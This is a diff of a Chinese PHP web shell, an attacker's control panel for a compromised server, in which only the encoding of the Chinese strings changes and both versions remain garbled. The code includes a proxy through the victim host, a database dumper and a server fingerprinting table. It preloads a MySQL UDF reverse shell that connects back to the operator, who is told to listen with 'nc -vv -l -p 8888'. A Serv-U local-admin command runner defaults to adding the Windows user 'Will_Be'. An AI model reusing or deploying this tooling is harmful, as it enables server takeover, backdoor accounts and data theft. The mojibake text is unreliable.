+	$tb->tdbody('æ–‡ä»¶ä½ç½®: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>æŸ¥æ‰¾æ–‡å­—:'.$tb->makeinput('oldkey','ä¸‹è´±','','text','60').''.$tb->makehidden('do','search').'<br> æ˜¯å¦è®¡ç®—æ‰€åœ¨è¡Œ<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'é€‰å®šæ­¤å¤„å°†ä¼šåˆ—å‡ºå…³é”®è¯åœ¨æ‰€åœ¨æ–‡ä»¶çš„å¤šå°‘è¡Œ,å’Œæ‰€åœ¨çš„é‚£æ–‡ä»¶æœ‰å¤šå°‘è¡Œè¿›è¡Œæ¯”å¯¹\\n\\næ ¼å¼ä¸º:[æ‰€åœ¨è¡Œ/æ–‡ä»¶æ€»è¡Œ]ä¾‹å¦‚[12/99],ç”¨æ¥è¿›è¡Œåˆ†æ.\\n\\næ­¤åŠŸèƒ½å¯èƒ½ä¼šå¢åŠ ä¸€éƒ¨åˆ†çš„å»¶æ—¶,è¯·è€ƒè™‘ä½¿ç”¨,æ²¡æœ‰å¯è¯»æƒé™å°†å‡ºé”™!\')"> (æ­¤åŠŸèƒ½å’Œä¸‹é¢ä¸€ä¸ªåŠŸèƒ½ä¼šå½±å“æ‰§è¡Œé€Ÿåº¦ï¼Œæ‰€ä»¥é»˜è®¤å…³é—­!) <br>é€‚å½“è¯»å–:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'é€‰å®šæ­¤å¤„å°†ä¼šåˆ—å‡ºå…³é”®è¯åœ¨æ‰€åœ¨ä½ç½®åŠä½ è®¾å®šç»“æŸåŒºåŸŸå†…çš„éƒ¨åˆ†å­—ç¬¦..\\n\\né‡‡å–æ­¤åŠŸèƒ½æŸ¥æ‰¾å®Œæ–‡ä»¶åæŠŠé¼ æ ‡ç§»åŠ¨åˆ°æ‰¾åˆ°çš„æ–‡ä»¶åä¸Šå³å¯è¯»å–åˆ†æ....\\n\\næ­¤åŠŸèƒ½å¯èƒ½ä¼šå¢åŠ ä¸€éƒ¨åˆ†çš„å»¶æ—¶,è¯·è€ƒè™‘ä½¿ç”¨,æ²¡æœ‰å¯è¯»æƒé™å°†å‡ºé”™!\')"> è¯»å–å…³é”®è¯å‰'.$tb->makeinput('beline','0','','text','3').'ä¸ªå­—ç¬¦ '.$tb->makehidden('dir',''.$dir.'').'åˆ°å…³é”®è¯åç¬¬'.$tb->makeinput('endline','10','','text','3').'ä¸ªå­—ç¬¦... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','å¼€å§‹æŸ¥æ‰¾æ–‡ä»¶','','submit'),'center','1','35');
 	echo "</form>";
-	$tb->tdbody('Çë±íÌ«´óµÄÄ¿Â¼ÁË£¬ÂıÂıä¯ÀÀÂıÂıÕÒºÃ²»ºÃÂï.¼ÙÉèÑ¡¶¨¼ÆËãĞĞËÙ¶È»áÂı¡£ÏÔÊ¾[ËùÔÚĞĞ/×Ü¹²¶àÉÙĞĞ]','center');
+	$tb->tdbody('è¯·è¡¨å¤ªå¤§çš„ç›®å½•äº†ï¼Œæ…¢æ…¢æµè§ˆæ…¢æ…¢æ‰¾å¥½ä¸å¥½å˜›.å‡è®¾é€‰å®šè®¡ç®—è¡Œé€Ÿåº¦ä¼šæ…¢ã€‚æ˜¾ç¤º[æ‰€åœ¨è¡Œ/æ€»å…±å¤šå°‘è¡Œ]','center');
 	$tb->tablefooter();
 }
 elseif ($_GET['action'] == "proxy") {
 	$action = '?action=proxy';
 	$tb->tableheader();
-	$tb->formheader($action,'ÔÚÏß´úÀí','proxyframe');
-	$tb->tdbody('<br><ul><li>ÓÃ±¾¹¦ÄÜ½öÊµÏÖ¼òµ¥µÄ HTTP ´úÀí,²»»áÏÔÊ¾Ê¹ÓÃÏà¶ÔÂ·¾¶µÄÍ¼Æ¬¡¢Á´½Ó¼°CSSÑùÊ½±í.</li><li>ÓÃ±¾¹¦ÄÜ¿ÉÒÔÍ¨¹ı±¾·şÎñÆ÷ä¯ÀÀÄ¿±êURL,µ«²»Ö§³Ö SQL Injection Ì½²âÒÔ¼°Ä³Ğ©ÌØÊâ×Ö·û.</li><li>ÓÃ±¾¹¦ÄÜä¯ÀÀµÄ URL,ÔÚÄ¿±êÖ÷»úÉÏÁôÏÂµÄIP¼ÇÂ¼ÊÇ : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
-	$tb->tdbody('URL: '.$tb->makeinput('url','http://1v1.name','','text','100').' '.$tb->makeinput('','ä¯ÀÀ','','submit'),'center','1','40');
+	$tb->formheader($action,'åœ¨çº¿ä»£ç†','proxyframe');
+	$tb->tdbody('<br><ul><li>ç”¨æœ¬åŠŸèƒ½ä»…å®ç°ç®€å•çš„ HTTP ä»£ç†,ä¸ä¼šæ˜¾ç¤ºä½¿ç”¨ç›¸å¯¹è·¯å¾„çš„å›¾ç‰‡ã€é“¾æ¥åŠCSSæ ·å¼è¡¨.</li><li>ç”¨æœ¬åŠŸèƒ½å¯ä»¥é€šè¿‡æœ¬æœåŠ¡å™¨æµè§ˆç›®æ ‡URL,ä½†ä¸æ”¯æŒ SQL Injection æ¢æµ‹ä»¥åŠæŸäº›ç‰¹æ®Šå­—ç¬¦.</li><li>ç”¨æœ¬åŠŸèƒ½æµè§ˆçš„ URL,åœ¨ç›®æ ‡ä¸»æœºä¸Šç•™ä¸‹çš„IPè®°å½•æ˜¯ : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
+	$tb->tdbody('URL: '.$tb->makeinput('url','http://1v1.name','','text','100').' '.$tb->makeinput('','æµè§ˆ','','submit'),'center','1','40');
 	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://1v1.name"></iframe>');
 	echo "</form>";
 	$tb->tablefooter();
@@ -769,12 +769,12 @@ elseif ($_GET['action'] == "sql") {
 	$sql_query = $_POST['sql_query'];
 if($type=="fun"){
 $sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
-select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*Õâ¸ö×îºÃÏÈÖ´ĞĞÁËÉÏÃæÒ»¾äÔÙÓÃ*/
-/*ÇëÔÚÄã¼ÆËã»úÉÏÖ´ĞĞ nc -vv -l -p 8888*/";
+select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*è¿™ä¸ªæœ€å¥½å…ˆæ‰§è¡Œäº†ä¸Šé¢ä¸€å¥å†ç”¨*/
+/*è¯·åœ¨ä½ è®¡ç®—æœºä¸Šæ‰§è¡Œ nc -vv -l -p 8888*/";
 }
 	$tb->tableheader();
-	$tb->formheader($action,'Ö´ĞĞ SQL Óï¾ä');
-	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','Á¬½Ó','','submit'));
+	$tb->formheader($action,'æ‰§è¡Œ SQL è¯­å¥');
+	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','è¿æ¥','','submit'));
 	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
 	$tb->makehidden('do','query');
 	$tb->formfooter('1','30');
@@ -787,8 +787,8 @@ elseif ($_GET['action'] == "sqlbak") {
 	$dbpassword = $_POST['dbpassword'];
 	$dbname = $_POST['dbname'];
 	$tb->tableheader();
-	$tb->formheader($action,'±¸·İ MySQL Êı¾İ¿â');
-	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','Á¬½Ó','','submit'));
+	$tb->formheader($action,'å¤‡ä»½ MySQL æ•°æ®åº“');
+	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','è¿æ¥','','submit'));
 	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
     $tables = @mysql_list_tables($dbname);
     while ($table = @mysql_fetch_row($tables)) {
@@ -796,9 +796,9 @@ elseif ($_GET['action'] == "sqlbak") {
     }
     @mysql_free_result($tables);
 	if (empty($cachetables)) {
-		$tb->tdbody('<b>ÄúÃ»ÓĞÁ¬½ÓÊı¾İ¿â or µ±Ç°Êı¾İ¿âÃ»ÓĞÈÎºÎÊı¾İ±í</b>');
+		$tb->tdbody('<b>æ‚¨æ²¡æœ‰è¿æ¥æ•°æ®åº“ or å½“å‰æ•°æ®åº“æ²¡æœ‰ä»»ä½•æ•°æ®è¡¨</b>');
 	} else {
-		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">ÇëÑ¡Ôñ±í:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> ±¸·İÊı¾İËù±£´æµÄÂ·¾¶:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> Ö±½ÓÏÂÔØµ½±¾µØ (ÊÊºÏÊı¾İÁ¿½ÏĞ¡µÄÊı¾İ¿â)</td></tr></table>');
+		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">è¯·é€‰æ‹©è¡¨:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> å¤‡ä»½æ•°æ®æ‰€ä¿å­˜çš„è·¯å¾„:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> ç›´æ¥ä¸‹è½½åˆ°æœ¬åœ° (é€‚åˆæ•°æ®é‡è¾ƒå°çš„æ•°æ®åº“)</td></tr></table>');
 		$tb->makehidden('do','backupmysql');
 		$tb->formfooter('0','30');
 	}
@@ -807,8 +807,8 @@ elseif ($_GET['action'] == "sqlbak") {
 }//end sql backup
 
 elseif ($_GET['action'] == "phpenv") {
-	$user = " <a href=\"?action=nowuser\" target=\"_blank\">ÒÔÃâcrushµã´Ë»ñÈ¡µ±Ç°½ø³ÌÓÃ»§Ãû</a> ";
-	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "²»ÔÊĞíÉÏ´«";
+	$user = " <a href=\"?action=nowuser\" target=\"_blank\">ä»¥å…crushç‚¹æ­¤è·å–å½“å‰è¿›ç¨‹ç”¨æˆ·å</a> ";
+	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "ä¸å…è®¸ä¸Šä¼ ";
 	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
 	if ($dis_func == "") {
 		$dis_func = "No";
@@ -818,55 +818,55 @@ elseif ($_GET['action'] == "phpenv") {
 	}
 	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
 		$info = array(
-		    0 => array("µ±Ç°php½ø³ÌÓÃ»§",$user),
-			1 => array("·şÎñÆ÷²Ù×÷ÏµÍ³",PHP_OS),
-			2 => array("·şÎñÆ÷Ê±¼ä",date("YÄêmÔÂdÈÕ h:i:s",time())),
-			3 => array("·şÎñÆ÷ÓòÃû","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
-			4 => array("·şÎñÆ÷IPµØÖ·",gethostbyname($_SERVER['SERVER_NAME'])),
-			5 => array("·şÎñÆ÷²Ù×÷ÏµÍ³ÎÄ×Ö±àÂë",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
-			6 => array("·şÎñÆ÷½âÒëÒıÇæ",$_SERVER['SERVER_SOFTWARE']),
-			7 => array("Web·şÎñ¶Ë¿Ú",$_SERVER['SERVER_PORT']),
-			8 => array("PHPÔËĞĞ·½Ê½",strtoupper(php_sapi_name())),
-			9 => array("PHP°æ±¾",PHP_VERSION),
-			10 => array("ÔËĞĞÓÚ°²È«Ä£Ê½",getphpcfg("safemode")),
-			11 => array("·şÎñÆ÷¹ÜÀíÔ±",$adminmail),
-			12 => array("±¾ÎÄ¼şÂ·¾¶",__FILE__),
-            13 => array("ÔÊĞíÊ¹ÓÃ URL ´ò¿ªÎÄ¼ş allow_url_fopen",getphpcfg("allow_url_fopen")),
-			14 => array("ÔÊĞí¶¯Ì¬¼ÓÔØÁ´½Ó¿â enable_dl",getphpcfg("enable_dl")),
-			15 => array("ÏÔÊ¾´íÎóĞÅÏ¢ display_errors",getphpcfg("display_errors")),
-			16 => array("×Ô¶¯¶¨ÒåÈ«¾Ö±äÁ¿ register_globals",getphpcfg("register_globals")),
+		    0 => array("å½“å‰phpè¿›ç¨‹ç”¨æˆ·",$user),
+			1 => array("æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ",PHP_OS),
+			2 => array("æœåŠ¡å™¨æ—¶é—´",date("Yå¹´mæœˆdæ—¥ h:i:s",time())),
+			3 => array("æœåŠ¡å™¨åŸŸå","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
+			4 => array("æœåŠ¡å™¨IPåœ°å€",gethostbyname($_SERVER['SERVER_NAME'])),
+			5 => array("æœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ–‡å­—ç¼–ç ",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
+			6 => array("æœåŠ¡å™¨è§£è¯‘å¼•æ“",$_SERVER['SERVER_SOFTWARE']),
+			7 => array("WebæœåŠ¡ç«¯å£",$_SERVER['SERVER_PORT']),
+			8 => array("PHPè¿è¡Œæ–¹å¼",strtoupper(php_sapi_name())),
+			9 => array("PHPç‰ˆæœ¬",PHP_VERSION),
+			10 => array("è¿è¡Œäºå®‰å…¨æ¨¡å¼",getphpcfg("safemode")),
+			11 => array("æœåŠ¡å™¨ç®¡ç†å‘˜",$adminmail),
+			12 => array("æœ¬æ–‡ä»¶è·¯å¾„",__FILE__),
+            13 => array("å…è®¸ä½¿ç”¨ URL æ‰“å¼€æ–‡ä»¶ allow_url_fopen",getphpcfg("allow_url_fopen")),
+			14 => array("å…è®¸åŠ¨æ€åŠ è½½é“¾æ¥åº“ enable_dl",getphpcfg("enable_dl")),
+			15 => array("æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ display_errors",getphpcfg("display_errors")),
+			16 => array("è‡ªåŠ¨å®šä¹‰å…¨å±€å˜é‡ register_globals",getphpcfg("register_globals")),
 			17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
-			18 => array("³ÌĞò×î¶àÔÊĞíÊ¹ÓÃÄÚ´æÁ¿ memory_limit",getphpcfg("memory_limit")),
-			19 => array("POST×î´ó×Ö½ÚÊı post_max_size",getphpcfg("post_max_size")),
-			20 => array("ÔÊĞí×î´óÉÏ´«ÎÄ¼ş upload_max_filesize",$upsize),
-			21 => array("³ÌĞò×î³¤ÔËĞĞÊ±¼ä max_execution_time",getphpcfg("max_execution_time")."Ãë"),
-			22 => array("±»½ûÓÃµÄº¯Êı disable_functions",$dis_func),
+			18 => array("ç¨‹åºæœ€å¤šå…è®¸ä½¿ç”¨å†…å­˜é‡ memory_limit",getphpcfg("memory_limit")),
+			19 => array("POSTæœ€å¤§å­—èŠ‚æ•° post_max_size",getphpcfg("post_max_size")),
+			20 => array("å…è®¸æœ€å¤§ä¸Šä¼ æ–‡ä»¶ upload_max_filesize",$upsize),
+			21 => array("ç¨‹åºæœ€é•¿è¿è¡Œæ—¶é—´ max_execution_time",getphpcfg("max_execution_time")."ç§’"),
+			22 => array("è¢«ç¦ç”¨çš„å‡½æ•° disable_functions",$dis_func),
 			23 => array("phpinfo()",$phpinfo),
-			24 => array("Ä¿Ç°»¹ÓĞ¿ÕÓà¿Õ¼ädiskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
-            25 => array("Í¼ĞÎ´¦Àí GD Library",getfun("imageline")),
-			26 => array("IMAPµç×ÓÓÊ¼şÏµÍ³",getfun("imap_close")),
-			27 => array("MySQLÊı¾İ¿â",getfun("mysql_close")),
-			28 => array("SyBaseÊı¾İ¿â",getfun("sybase_close")),
-			29 => array("OracleÊı¾İ¿â",getfun("ora_close")),
-			30 => array("Oracle 8 Êı¾İ¿â",getfun("OCILogOff")),
-			31 => array("PRELÏàÈİÓï·¨ PCRE",getfun("preg_match")),
-			32 => array("PDFÎÄµµÖ§³Ö",getfun("pdf_close")),
-			33 => array("Postgre SQLÊı¾İ¿â",getfun("pg_close")),
-			34 => array("SNMPÍøÂç¹ÜÀíĞ­Òé",getfun("snmpget")),
-			35 => array("Ñ¹ËõÎÄ¼şÖ§³Ö(Zlib)",getfun("gzclose")),
-			36 => array("XML½âÎö",getfun("xml_set_object")),
+			24 => array("ç›®å‰è¿˜æœ‰ç©ºä½™ç©ºé—´diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
+            25 => array("å›¾å½¢å¤„ç† GD Library",getfun("imageline")),
+			26 => array("IMAPç”µå­é‚®ä»¶ç³»ç»Ÿ",getfun("imap_close")),
+			27 => array("MySQLæ•°æ®åº“",getfun("mysql_close")),
+			28 => array("SyBaseæ•°æ®åº“",getfun("sybase_close")),
+			29 => array("Oracleæ•°æ®åº“",getfun("ora_close")),
+			30 => array("Oracle 8 æ•°æ®åº“",getfun("OCILogOff")),
+			31 => array("PRELç›¸å®¹è¯­æ³• PCRE",getfun("preg_match")),
+			32 => array("PDFæ–‡æ¡£æ”¯æŒ",getfun("pdf_close")),
+			33 => array("Postgre SQLæ•°æ®åº“",getfun("pg_close")),
+			34 => array("SNMPç½‘ç»œç®¡ç†åè®®",getfun("snmpget")),
+			35 => array("å‹ç¼©æ–‡ä»¶æ”¯æŒ(Zlib)",getfun("gzclose")),
+			36 => array("XMLè§£æ",getfun("xml_set_object")),
 			37 => array("FTP",getfun("ftp_login")),
-			38 => array("ODBCÊı¾İ¿âÁ¬½Ó",getfun("odbc_close")),
-			39 => array("SessionÖ§³Ö",getfun("session_start")),
-			40 => array("SocketÖ§³Ö",getfun("fsockopen")),
+			38 => array("ODBCæ•°æ®åº“è¿æ¥",getfun("odbc_close")),
+			39 => array("Sessionæ”¯æŒ",getfun("session_start")),
+			40 => array("Socketæ”¯æŒ",getfun("fsockopen")),
 		); 
 	$tb->tableheader();
 	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
-	$tb->tdbody('<b>²é¿´PHPÅäÖÃ²ÎÊı×´¿ö</b>','left','1','30','style="padding-left: 5px;"');
-	$tb->tdbody('ÇëÊäÈëÅäÖÃ²ÎÊı(Èç:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','²é¿´','','submit'),'left','2','30','style="padding-left: 5px;"');
+	$tb->tdbody('<b>æŸ¥çœ‹PHPé…ç½®å‚æ•°çŠ¶å†µ</b>','left','1','30','style="padding-left: 5px;"');
+	$tb->tdbody('è¯·è¾“å…¥é…ç½®å‚æ•°(å¦‚:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','æŸ¥çœ‹','','submit'),'left','2','30','style="padding-left: 5px;"');
 	$tb->makehidden('do','viewphpvar');
 	echo "</form>\n";
-	$hp = array(0=> '·şÎñÆ÷ÌØĞÔ', 1=> 'PHP»ù±¾ÌØĞÔ', 2=> '×é¼şÖ§³Ö×´¿ö');
+	$hp = array(0=> 'æœåŠ¡å™¨ç‰¹æ€§', 1=> 'PHPåŸºæœ¬ç‰¹æ€§', 2=> 'ç»„ä»¶æ”¯æŒçŠ¶å†µ');
 	for ($a=0;$a<3;$a++) {
 		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
 ?>
@@ -1003,22 +1003,22 @@ elseif($_GET['action'] == "SUExp")
 ?>
 <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
   <tr class="firstalt">
-    <td align="center">Í¨¹ıServ-U ±¾µØ¹ÜÀíÔ±ÕÊºÅÖ´ĞĞÃüÁî</td>
+    <td align="center">é€šè¿‡Serv-U æœ¬åœ°ç®¡ç†å‘˜å¸å·æ‰§è¡Œå‘½ä»¤</td>
   </tr>
   <form action="?action=SUExp" method="POST">
   <tr class="secondalt">
     <td align="center">LocalPort:
-      <input name="SUPort" type="text" class="INPUT" id="SUPort" value="43958" size="7">      ¡¡
+      <input name="SUPort" type="text" class="INPUT" id="SUPort" value="43958" size="7">      ã€€
       LocalUser:
-      <input name="SUUser" type="text" class="INPUT" id="SUUser" value="LocalAdministrator">       ¡¡LocalPass:
+      <input name="SUUser" type="text" class="INPUT" id="SUUser" value="LocalAdministrator">       ã€€LocalPass:
       <input name="SUPass" type="text" class="INPUT" id="SUPass" value="#l@$ak#.lk;0@P">
       <br>
-      Command¡¡:
+      Commandã€€:
       <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user Will_Be heihei /add" size="50"></td>
   </tr>
   <tr class="secondalt">
-    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="Ö´ĞĞ">¡¡
-      <input name="Submit" type="reset" class="INPUT" value="ÖØÖÃ"></td>
+    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="æ‰§è¡Œ">ã€€
+      <input name="Submit" type="reset" class="INPUT" value="é‡ç½®"></td>
   </tr>  
   </form>
 </table>
@@ -1042,10 +1042,10 @@ elseif($_GET['action'] == "SUExp")
 <?php
 
 /*======================================================
-º¯Êı¿â
+å‡½æ•°åº“
 ======================================================*/
 
-	// µÇÂ½Èë¿Ú
+	// ç™»é™†å…¥å£
 	function loginpage() {
 ?>
 <style type="text/css">
@@ -1067,7 +1067,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		exit;
 	}//end loginpage()
 
-	// Ò³Ãæµ÷ÊÔĞÅÏ¢
+	// é¡µé¢è°ƒè¯•ä¿¡æ¯
 	function debuginfo() {
 		global $starttime;
 		$mtime = explode(' ', microtime());
@@ -1075,7 +1075,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		echo "Processed in $totaltime second(s)";
 	}
 
-	// È¥µô×ªÒå×Ö·û
+	// å»æ‰è½¬ä¹‰å­—ç¬¦
 	function stripslashes_array(&$array) {
 		while(list($key,$var) = each($array)) {
 			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
@@ -1090,7 +1090,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		return $array;
 	}
 
-	// É¾³ıÄ¿Â¼
+	// åˆ é™¤ç›®å½•
 	function deltree($deldir) {
 		$mydir=@dir($deldir);	
 		while($file=$mydir->read())	{ 		
@@ -1108,7 +1108,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		return (@rmdir($deldir)) ? 1 : 0;
 	} 
 
-	// ÅĞ¶Ï¶ÁĞ´Çé¿ö
+	// åˆ¤æ–­è¯»å†™æƒ…å†µ
 	function dir_writeable($dir) {
 		if (!is_dir($dir)) {
 			@mkdir($dir, 0777);
@@ -1125,7 +1125,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		return $writeable;
 	}
 
-	// ±í¸ñĞĞ¼äµÄ±³¾°É«Ìæ»»
+	// è¡¨æ ¼è¡Œé—´çš„èƒŒæ™¯è‰²æ›¿æ¢
 	function getrowbg() {
 		global $bgcounter;
 		if ($bgcounter++%2==0) {
@@ -1135,7 +1135,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		}
 	}
 
-	// »ñÈ¡µ±Ç°µÄÎÄ¼şÏµÍ³Â·¾¶
+	// è·å–å½“å‰çš„æ–‡ä»¶ç³»ç»Ÿè·¯å¾„
 	function getPath($mainpath, $relativepath) {
 		global $dir;
 		$mainpath_info           = explode('/', $mainpath);
@@ -1153,7 +1153,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		return implode('/', $mainpath_info);
 	}
 
-	// ¼ì²éPHPÅäÖÃ²ÎÊı
+	// æ£€æŸ¥PHPé…ç½®å‚æ•°
 	function getphpcfg($varname) {
 		switch($result = get_cfg_var($varname)) {
 			case 0:
@@ -1168,12 +1168,12 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		}
 	}
 
-	// ¼ì²éº¯ÊıÇé¿ö
+	// æ£€æŸ¥å‡½æ•°æƒ…å†µ
 	function getfun($funName) {
 		return (false !== function_exists($funName)) ? "Yes" : "No";
 	}
 
-	// Ñ¹Ëõ´ò°üÀà
+	// å‹ç¼©æ‰“åŒ…ç±»
 	class PHPZip{
 	var $out='';
 		function PHPZip($dir)	{
@@ -1181,7 +1181,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 				$curdir = getcwd();
 				if (is_array($dir)) $filelist = $dir;
 		        else{
-			        $filelist=$this -> GetFileList($dir);//ÎÄ¼şÁĞ±í
+			        $filelist=$this -> GetFileList($dir);//æ–‡ä»¶åˆ—è¡¨
 				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
 	            }
 		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
@@ -1204,7 +1204,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 			else return 0;
 		}
 
-		// »ñµÃÖ¸¶¨Ä¿Â¼ÎÄ¼şÁĞ±í
+		// è·å¾—æŒ‡å®šç›®å½•æ–‡ä»¶åˆ—è¡¨
 		function GetFileList($dir){
 			static $a;
 			if (is_dir($dir)) {
@@ -1314,7 +1314,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 	    }
 	}
 
-	// ±¸·İÊı¾İ¿â
+	// å¤‡ä»½æ•°æ®åº“
 	function sqldumptable($table, $fp=0) {
 		$tabledump = "DROP TABLE IF EXISTS $table;\n";
 		$tabledump .= "CREATE TABLE $table (\n";
@@ -1435,7 +1435,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		function tdheader($title) {
 			global $dir;
 			echo "  <tr class=\"firstalt\">\n";
-			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">·µ»Ø</a>]</b></td>\n";
+			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">è¿”å›</a>]</b></td>\n";
 			echo "  </tr>\n";
 		}
 
@@ -1463,7 +1463,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 			$target = empty($target) ? "" : " target=\"".$target."\"";
 			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
 			echo "  <tr class=\"firstalt\">\n";
-			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">·µ»Ø</a>]</b></td>\n";
+			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">è¿”å›</a>]</b></td>\n";
 			echo "  </tr>\n";
 		}
 
@@ -1485,7 +1485,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		function formfooter($over='',$height=''){
 			$height = empty($height) ? "" : " height=\"".$height."\"";
 			echo "  <tr class=\"secondalt\">\n";
-			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"È·¶¨\"></td>\n";
+			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"ç¡®å®š\"></td>\n";
 			echo "  </tr>\n";
 			echo " </form>\n";
 			echo $end = empty($over) ? "" : "</table>\n";
@@ -1525,7 +1525,7 @@ input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";heig
 		}
 	}
 	
-	function find($path) //²éÕÒ¹Ø¼ü´Ê 
+	function find($path) //æŸ¥æ‰¾å…³é”®è¯ 
 { 
 	global $oldkey,$type,$type2,$endline,$beline; 
 	if(is_dir("$path")){ 
@@ -1557,7 +1557,7 @@ if($type2=="getpath"){
 	$getpath = htmlspecialchars(substr($msg, $get, $endline)); 
 	$getpath = "title = \"".$getpath."\"";
 }
